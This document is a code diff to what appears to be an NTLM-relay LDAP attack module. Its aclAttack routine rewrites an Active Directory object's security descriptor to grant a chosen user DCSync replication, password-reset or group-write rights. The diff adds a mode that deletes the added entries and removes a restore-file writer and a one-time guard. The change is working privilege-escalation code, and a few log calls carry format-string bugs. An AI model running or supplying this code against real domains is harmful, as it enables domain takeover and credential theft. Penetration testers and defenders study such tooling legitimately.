@@ -400,20 +400,41 @@ class LDAPAttack(ProtocolAttack):
                 LOG.error('The server returned an error: %s', self.client.result['message'])
         return
 
+    def dacl_remove_ace(self,secdesc, guid, usersid, accesstype):
+        to_remove = None
+        binguid = string_to_bin(guid)
+        for ace in secdesc['Dacl'].aces:
+            sid = ace['Ace']['Sid'].formatCanonical()
+            # Is it the correct ACE type?
+            if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
+                continue
+            # Is it the correct SID?
+            if sid != usersid:
+                continue
+            # Does it apply to the correct property?
+            if ace['Ace']['ObjectType'] != binguid:
+                continue
+            # Does it have the correct mask?
+            if ace['Ace']['Mask']['Mask'] != accesstype:
+                continue
+            # We are still here -> this is the correct ACE
+            to_remove = ace
+            break
+
+        if to_remove:
+            # Found! Remove
+            secdesc['Dacl'].aces.remove(to_remove)
+            return True
+        else:
+            # Not found
+            return False
+
     def aclAttack(self, userDn, domainDumper):
         rights = {
                 'dcsync':['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2','89e95b76-444d-4c62-991a-0facbeda640c'],
                 'resetpassword':['00299570-246d-11d0-a768-00aa006e0529'],
                 'writemembers':['bf9679c0-0de6-11d0-a285-00aa003049e2']
             }
-
-        global alreadyEscalated
-        if alreadyEscalated:
-            LOG.error('ACL attack already performed. Refusing to continue')
-            return
-
-        # Dictionary for restore data
-        restoredata = {}
 
         # Query for the sid of our user
         try:
@@ -432,55 +453,54 @@ class LDAPAttack(ProtocolAttack):
 
         LOG.info('Querying domain security descriptor')
         self.client.search(domainDumper.root, f'(&(objectClass=*)(distinguishedName={self.args.targetidentity}))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
+        
+        if len(self.client.entries) == 0:
+            LOG.error(f'{self.args.targetidentity} not found in domain. Ensure to use valid object distinguishedName property')
+            return
+
         entry = self.client.entries[0]
         secDescData = entry['nTSecurityDescriptor'].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
 
-        # Save old SD for restore purposes
-        restoredata['old_sd'] = binascii.hexlify(secDescData).decode('utf-8')
-        restoredata['target_sid'] = usersid
-
-        for guid in rights[self.args.rights]:
-            secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
-            secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+        if not self.args.delete:
+            for guid in rights[self.args.rights]:
+                secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+                secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+        else:
+            accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
+            for guid in rights[self.args.rights]:
+                if not self.dacl_remove_ace(secDesc, guid, usersid, accesstype):
+                    LOG.error(f'ACE not found in {self.args.targetidentity}')
+                    return
         
         dn = entry.entry_dn
         data = secDesc.getData()
         self.client.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
         if self.client.result['result'] == 0:
-            alreadyEscalated = True
-            if self.args.rights == 'dcsync':
-                LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
-            elif self.args.rights == 'writemembers':
-                LOG.info('Success! User %s now has GenericWrite privileges on %s', username, self.args.targetidentity)
-            elif self.args.rights == 'all':
-                LOG.info('Success! User %s now has GenericAll privileges on $s', username, self.args.targetidentity)
+            if not self.args.delete:
+                if self.args.rights == 'dcsync':
+                    LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
+                elif self.args.rights == 'writemembers':
+                    LOG.info('Success! User %s now has GenericWrite privileges on %s', username, self.args.targetidentity)
+                elif self.args.rights == 'all':
+                    LOG.info('Success! User %s now has GenericAll privileges on $s', username, self.args.targetidentity)
+            else:
+                if self.args.rights == 'dcsync':
+                    LOG.info('Success! Replication-Get-Changes-All privileges restored for %s', username)
+                elif self.args.rights == 'writemembers':
+                    LOG.info('Success! GenericWrite privileges restored for %s', username, self.args.targetidentity)
+                elif self.args.rights == 'all':
+                    LOG.info('Success! GenericAll privileges restored for %s', username, self.args.targetidentity)
+
 
             # Query the SD again to see what AD made of it
             self.client.search(domainDumper.root, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
             entry = self.client.entries[0]
             newSD = entry['nTSecurityDescriptor'].raw_values[0]
-            # Save this to restore the SD later on
-            restoredata['target_dn'] = dn
-            restoredata['new_sd'] = binascii.hexlify(newSD).decode('utf-8')
-            restoredata['success'] = True
-            self.writeRestoreData(restoredata, dn)
             return True
         else:
             LOG.error('Error when updating ACL: %s' % self.client.result)
             return False
-
-    def writeRestoreData(self, restoredata, domaindn):
-        output = {}
-        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
-        output['config'] = {'server':self.client.server.host,'domain':domain}
-        output['history'] = [{'operation': 'add_domain_sync', 'data': restoredata, 'contextuser': self.username}]
-        now = datetime.datetime.now()
-        filename = 'aclpwn-%s.restore' % now.strftime("%Y%m%d-%H%M%S")
-        # Save the json to file
-        with codecs.open(filename, 'w', 'utf-8') as outfile:
-            json.dump(output, outfile)
-        LOG.info('Saved restore state to %s', filename)
 
     def validatePrivileges(self, uname, domainDumper):
         # Find the user's DN
